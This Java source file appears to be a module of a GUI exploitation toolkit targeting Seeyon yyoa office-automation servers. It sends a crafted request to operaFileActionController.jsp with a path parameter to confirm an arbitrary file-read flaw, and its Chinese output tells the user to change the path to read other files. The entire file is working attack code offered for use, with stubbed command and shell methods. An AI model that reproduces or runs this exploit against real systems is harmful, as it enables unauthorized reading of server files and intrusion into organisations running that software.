package exp.oa.seeyonoa.yyoa;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;

import java.util.HashMap;

public class seeyon_yyoa_operaFile_FileRead implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea, textArea_cmd);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        Platform.runLater(() -> {
            textArea.appendText("\n 该漏洞为文件读取，请访问url进行测试");
        });
        return null;
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            head.put("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0");
            head.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
            Response get_res = HttpTools.get(url + "/yyoa/portal/style/controller/operaFileActionController.jsp?path=/index.jsp&fileop=find" , head, "utf-8");
            if (get_res.getCode() == 200 && get_res.getText().contains("IP")) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ seeyon_yyoa_operaFile_FileRead ]");
                    textArea.appendText("\n 漏洞页面: "+url + "/yyoa/portal/style/controller/operaFileActionController.jsp?path=/index.jsp&fileop=find");
                    textArea.appendText("\n path更改文件路径");
                });

                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
}
